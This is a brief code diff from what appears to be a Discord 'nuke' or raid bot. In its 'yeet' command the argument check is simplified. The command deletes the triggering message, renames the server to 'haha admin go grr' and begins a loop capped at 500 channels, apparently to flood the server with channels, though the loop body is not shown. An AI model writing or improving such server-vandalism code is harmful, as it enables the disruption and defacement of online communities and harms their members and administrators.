@@ -20,7 +20,7 @@ client.on("message", (message) => {
         case "yeet":
             message.delete();
             let i;
-            if(!args.slice(0).join(' ')){ 
+            if(!args[0]){ 
                 message.guild.setName('haha admin go grr')
                 for(i = 0; i < 251; i++){
                   if(message.guild.channels.cache.size == "500") break;
